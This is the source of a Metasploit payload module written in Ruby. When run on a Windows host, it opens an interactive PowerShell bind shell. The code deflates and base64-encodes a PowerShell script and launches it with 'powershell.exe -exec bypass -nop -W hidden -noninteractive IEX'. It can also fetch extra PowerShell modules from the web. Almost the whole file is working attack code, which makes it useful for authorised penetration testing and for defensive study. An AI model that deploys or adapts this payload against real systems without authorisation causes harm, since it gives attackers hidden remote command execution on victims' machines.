##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/payload/windows/exec'

###
#
# Extends the Exec payload to add a new user.
#
###
module Metasploit3

  CachedSize = 443

  include Msf::Payload::Windows::Exec

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Windows Interactive Powershell Session, Bind TCP',
      'Description'   => 'Listen for a connection and spawn an interactive powershell session',
      'Author'        =>
        [
          'Ben Turner', # benpturner
          'Dave Hardy' # davehardy20
        ],
      'References'    =>
        [
          ['URL', 'https://www.nettitude.co.uk/interactive-powershell-session-via-metasploit/']
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::CommandShell,
      ))

    # Register command execution options
    register_options(
      [
        OptString.new('LOAD_MODULES', [ false, "A list of powershell modules seperated by a comma to download over the web", nil ]),
      ], self.class)
    # Hide the CMD option...this is kinda ugly
    deregister_options('CMD')
  end

  #
  # compression function for powershell
  #
  def compress_script(script_in, eof = nil)

    # Compress using the Deflate algorithm
    compressed_stream = ::Zlib::Deflate.deflate(script_in,
      ::Zlib::BEST_COMPRESSION)

    # Base64 encode the compressed file contents
    encoded_stream = Rex::Text.encode_base64(compressed_stream)

    # Build the powershell expression
    # Decode base64 encoded command and create a stream object
    psh_expression =  "$stream = New-Object IO.MemoryStream(,"
    psh_expression += "$([Convert]::FromBase64String('#{encoded_stream}')));"
    # Read & delete the first two bytes due to incompatibility with MS
    psh_expression += "$stream.ReadByte()|Out-Null;"
    psh_expression += "$stream.ReadByte()|Out-Null;"
    # Uncompress and invoke the expression (execute)
    psh_expression += "$(Invoke-Expression $(New-Object IO.StreamReader("
    psh_expression += "$(New-Object IO.Compression.DeflateStream("
    psh_expression += "$stream,"
    psh_expression += "[IO.Compression.CompressionMode]::Decompress)),"
    psh_expression += "[Text.Encoding]::ASCII)).ReadToEnd());"

    return psh_expression
  end

  #
  # Override the exec command string
  #
  def command_string
    lport = datastore['LPORT']

    template_path = File.join(
    Msf::Config.data_directory,
    'exploits',
    'powershell',
    'powerfun.ps1')

    script_in = File.read(template_path)
    script_in << "\npowerfun -Command bind"

    mods = ''

    if datastore['LOAD_MODULES']
      mods_array = datastore['LOAD_MODULES'].to_s.split(',')
      mods_array.collect(&:strip)
      print_status("Loading #{mods_array.count} modules into the interactive PowerShell session")
      mods_array.each {|m| vprint_good " #{m}"}
      mods = "\"#{mods_array.join("\",\n\"")}\""
      script_in << " -Download true\n"
    end

    script_in.gsub!('MODULES_REPLACE', mods)
    script_in.gsub!('LPORT_REPLACE', lport.to_s)
    # Base64 encode the compressed file contents
    script = compress_script(script_in)
    "powershell.exe -exec bypass -nop -W hidden -noninteractive IEX $(#{script})"

  end
end

